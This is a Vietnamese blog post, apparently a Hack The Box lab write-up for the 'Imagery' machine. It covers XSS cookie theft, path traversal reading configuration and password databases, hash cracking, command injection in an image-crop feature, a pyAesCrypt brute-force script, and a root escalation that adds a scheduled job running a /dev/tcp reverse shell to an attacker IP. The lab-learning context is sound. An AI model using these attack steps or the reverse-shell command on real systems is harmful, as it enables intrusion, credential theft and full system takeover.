---
layout: post
title: "Imagery"
date: 2026-01-27 14:15:00 +0700
tags: redteam Machine-Hard Windows
categories: jekyll update
--- 

# Imagery 

Đầu tiên mình thực hiện scan qua các port phổ biến. 

![image](/assets/images/HTB/season9/Imagery/image1.png)

* Các port - service đang mở: 
    * 22/tcp - ssh
    * 8000/tcp - http 
    * 8181/tcp - ? 

Như vậy thì có 1 web đang mở qua port 8000, sau khi thêm vào trong **/etc/hosts** thì mình truy cập qua trình duyệt. 

![image](/assets/images/HTB/season9/Imagery/image2.png)

Hoàn toàn mình ko thể lấy được source. Nên bắt buộc mình phải scan và review source code trên trình duyệt. 

Sau khi review source trên trình duyệt thì thấy có đoạn script khá dài. 
Trong đó chứa các endpoint api:
- `/login`
- `/register`
- `/admin/bug_reports`
- `/admin/delete_bug_report`
- `/admin/get_system_log?log_identifier=${encodeURIComponent(logIdentifier)}.log`
- `/admin/delete_user`
- `/admin/users`
- `/report_bug`

Thì ngoài các endpoint có `admin` thì nó phải authen user là admin. 

Nhưng mà chỗ endpoint `get_system_log` thì nó nhận vào 1 file thì mình nghi ngờ nó có thể bị **path traversal** và endpoint `/report_bug` thì ai sẽ tiếp nhận thông tin đó?

Kết quả scan thì mình ko thu được gì
![image](/assets/images/HTB/season9/Imagery/image3.png)

Sau đó, tiếp tục mình đào sâu vào endpoint `/report_bug`

![image](/assets/images/HTB/season9/Imagery/image4.png)

Sau khi gửi data vào thì mình cần tạo 1 tài khoản.

![image](/assets/images/HTB/season9/Imagery/image5.png)

Thì sau khi register và login vào, nó sinh ra 1 session để authorization quyền hạn của mình rồi lưu vào trong cookie.

![image](/assets/images/HTB/season9/Imagery/image6.png)

Và lí do tại sao mình bỏ qua `/login`, `/register` tại sao ko bị sqli. vì mình đã test rồi nhưng nó ko ra kết quả có thể đã dùng prepared statment hoặc ORM. 

Rồi mình quay lại với `/report_bug`

![image](/assets/images/HTB/season9/Imagery/image7.png)

Thì thấy người review là **admin**, chắc chắn là phải sở hữu user **admin** và cả session trong cookie. 

Nếu mà mình lấy được **cookie** thông qua `bugDetails` gửi về server mình giữ. Thì chắc chắn thực hiện được thì nó là **XSS**

![image](/assets/images/HTB/season9/Imagery/image8.png)

Quay lại với server mình dựng. 

![image](/assets/images/HTB/season9/Imagery/image9.png)

Hoàn toàn mình lụm được session của admin. Lấy đó thay đổi session trong browser. 

![image](/assets/images/HTB/season9/Imagery/image10.png)

Lòi ra thêm **Admin Panel**, thấy có 1 user nữa là <a style="color: blue; font-weight: bold;">testuser@imagery.htb</a>

![image](/assets/images/HTB/season9/Imagery/image11.png)

Và khi mình ấn download thì nó gọi tới endpoint `get_system_log`, như phân tích ở trên thì thấy nó có thể bị **path traversal**, và mình đoán logic thì nó sẽ đi tìm tên file thông qua đường dẫn file đã cung cấp sẵn. 

![image](/assets/images/HTB/season9/Imagery/image12.png)

![image](/assets/images/HTB/season9/Imagery/image13.png)

Có vẻ là nó đã đọc lun nội dung của file cung cấp. 

![image](/assets/images/HTB/season9/Imagery/image14.png)

Nó hoàn toàn duyệt qua đường dẫn tuyệt đối. Nếu vậy mình có thể mò tới file `/proc/self/environ` ➡️ đây là file (ảo) lưu các biến môi trường mà tiến trình đang dùng tới. 

![image](/assets/images/HTB/season9/Imagery/image15.png)

Sau khi đọc thì thu được: 
- `/home/web/web` 
- `/env/bin:/sbin`
- `USER=web LOGNAME=`
- `webHOME=/home`
- `webSHELL=/bin/bash`
- `MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/flaskapp.service/memory.pressure`

Vậy mình thấy ứng dụng web này đang chạy **flask** => Python.

Sau khi hỏi AI thì nó nói như sau 

![image](/assets/images/HTB/season9/Imagery/image16.png)

Mình thấy có file `config.py` uy tín á, nên đọc thử. 

![image](/assets/images/HTB/season9/Imagery/image17.png)

Lại ra thêm file `db.json`, đọc thử lun

![image](/assets/images/HTB/season9/Imagery/image18.png)

Trong này chứa hai hash password, mình đoán đây là md5. Lấy về và mình crack nó bằng john. 

![image](/assets/images/HTB/season9/Imagery/image19.png)

Và chỉ crack ra được user **testuser@imagery.htb**. Như vậy, mình login thử. Và mình còn chức năng **upload**, cho nên mình thử lun.

![image](/assets/images/HTB/season9/Imagery/image20.png)

Đã upload thành công thì chỉ khi user **testuser@imagery.htb** mới có các chức năng khác. 

![image](/assets/images/HTB/season9/Imagery/image21.png)

Mình cũng đã thử inject html vào trong các trường **title**, **Description** nhưng ko hoạt động. 

![image](/assets/images/HTB/season9/Imagery/image22.png)

Đối với các chức năng: 
- `Edit Details`
- `Convert Format`
- `Transform Image`

Mình đã test qua `Edit Details` và `Convert Format` thì ko có vấn đề gì. Quan trọng nằm tại `Transform Image`

![image](/assets/images/HTB/season9/Imagery/image23.png)

Đối với option `Rotate`:

![image](/assets/images/HTB/season9/Imagery/image24.png)

Ở đây nhận vào 1 số integer -> thì theo mình đoán thì số này sau đó sẽ được lưu vào đâu đó, có thể là trong db. Cho nên mình thử inject dấu `'` hoặc `"` 

![image](/assets/images/HTB/season9/Imagery/image25.png)

Nó sẽ thông báo lỗi trong `ConvertImageCommand`, như vậy cũng chưa thể nói lên điều gì, nên mình tiếp tục đến chức năng khác. 

Đối với `Saturation`:

![image](/assets/images/HTB/season9/Imagery/image26.png)

Ở đây nhận 1 số thực, và mình cũng test tương tự. 

![image](/assets/images/HTB/season9/Imagery/image27.png)

Như vậy thì thấy nó báo ko chuyển `'` thành float, đoán ở trường này chỉ nhận số thực. 

Đối với `Brightness` và `Constrat` thì hoàn toàn tương tự và ko có gì. Vậy chỉ còn `Crop`.

![image](/assets/images/HTB/season9/Imagery/image28.png)

Hoàn toàn nhận vào các số nguyên, mình tiếp tục test. 

![image](/assets/images/HTB/season9/Imagery/image29.png)

Ở đây nó lại hiển thị ra lỗi Syntax qua **/bin/sh** thì có nghĩa là nó thực hiện qua <a style="color: red; font-weight: bold;">system command</a>, như vậy thì nó bị **Command Injection** mà mình test 4 trường thì hoàn toàn đều bị hết. 

![image](/assets/images/HTB/season9/Imagery/image30.png)

Từ đây thì mình hoàn toàn có thể RCE. Thông qua [rev-shell]("https://www.revshells.com/") để lấy reverse shell. 

![image](/assets/images/HTB/season9/Imagery/image31.png)

![image](/assets/images/HTB/season9/Imagery/image32.png)

Từ đây mình có list toàn bộ source 

![image](/assets/images/HTB/season9/Imagery/image33.png)

Mình đi vào folder **bot** 

![image](/assets/images/HTB/season9/Imagery/image34.png)

Từ đây mình đọc được password của **admin**, nhưng mà nó cũng ko giúp ích gì lắm vì mình đã vào được Admin panel. 

Giờ mình thử tìm kiếm thì nó có chứa file nào quan trọng ko? 

![image](/assets/images/HTB/season9/Imagery/image35.png)

Có file `/var/backup` -> lấy thử 

![image](/assets/images/HTB/season9/Imagery/image36.png)

Thấy có file này thì `.aes` chắc là đã mã hóa bằng `aes` thật. Để lấy file về thì mở server python. Sau khi lấy về thì cần hỏi làm sao để mở file này. 

![image](/assets/images/HTB/season9/Imagery/image37.png)

File này được tạo bằng **pyAesCrypt 6.1.1**, thì làm sao biết được password để crack cho nên phải crack password.

```python=
import pyAesCrypt 
import sys 

def decrypt(encrypted_file, password):
    try: 
        pyAesCrypt.decryptFile(
            encrypted_file,
            "web_20250806_120723.zip",
            password,
            256 * 1024
        )
        return True 
    except: 
        return False 
    
with open('/usr/share/wordlist/rockyou.txt', 'r', encoding='latin-1') as f:
    for line in f: 
        password = line.strip()
        print(f"Trying: {password}", end='\r')
        
        if decrypt('web_20250806_120723.zip.aes', password):
            print(f"[+] Password found: {password}")
            sys.exit(0)

print("\n[-] Password not found")
```

Sau khi chạy mình thu được 

![image](/assets/images/HTB/season9/Imagery/image38.png)

Như vậy hoàn toàn thu được file đã giải nén bằng pass mới crack. 

Sau khi đọc source tại file `db.json` có thêm các account khác. 

![image](/assets/images/HTB/season9/Imagery/image39.png)

Lại đem đi crack pass típ. Crack user **mark** với **web**

![image](/assets/images/HTB/season9/Imagery/image40.png)

Vậy chỉ crack được password của mark, đổi sang user mark coi có gì khác ko. 

![image](/assets/images/HTB/season9/Imagery/image41.png)

Sau đó test trên user này bằng **sudo -l**

![image](/assets/images/HTB/season9/Imagery/image42.png)

Thì thấy có **charcol**, ở đây nó chạy với **root** nhưng ko yêu cầu password

![image](/assets/images/HTB/season9/Imagery/image43.png)

Sau khi, đọc qua thì thấy đây là tool đã tạo ra file encrypt **backup** mà mình đã lấy về.

Mình thêm dòng này vào để thao tác dễ dàng hơn: `python3 -c 'import pty; pty.spawn("/bin/bash")'`

Sau đó, chạy `sudo /usr/local/bin/charcol shell` thì nó sẽ báo lỗi, cần nhập 1 password

![image](/assets/images/HTB/season9/Imagery/image44.png)

Sau đó, mình cần `reset` lại `password` 

![image](/assets/images/HTB/season9/Imagery/image45.png)

Chạy lại thì chọn `no password `

![image](/assets/images/HTB/season9/Imagery/image46.png)

Sau khi mò thì cũng đã vào được `charcol`

![image](/assets/images/HTB/season9/Imagery/image47.png)

Mình chạy lệnh **help**

![image](/assets/images/HTB/season9/Imagery/image48.png)

Tui thấy có mục **Automated Jobs** ➡️ từ đây mình có thể thêm 1 reverve shell vào trong task thì nó sẽ chạy bằng root, khi đó mình leo quyền thành công. 

```bash 
auto add --schedule "* * * * *" --commnd "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.47/4321 0>&1'" --name 'RevShell'
```

![image](/assets/images/HTB/season9/Imagery/image49.png)

Quay lại netcat thì hoàn mình đã có quyền root 

![image](/assets/images/HTB/season9/Imagery/image50.png)


Tiếp tục mò trên folder của user này. 

![image](/assets/images/HTB/season9/Imagery/image51.png)

![image](/assets/images/HTB/season9/Imagery/image52.png)





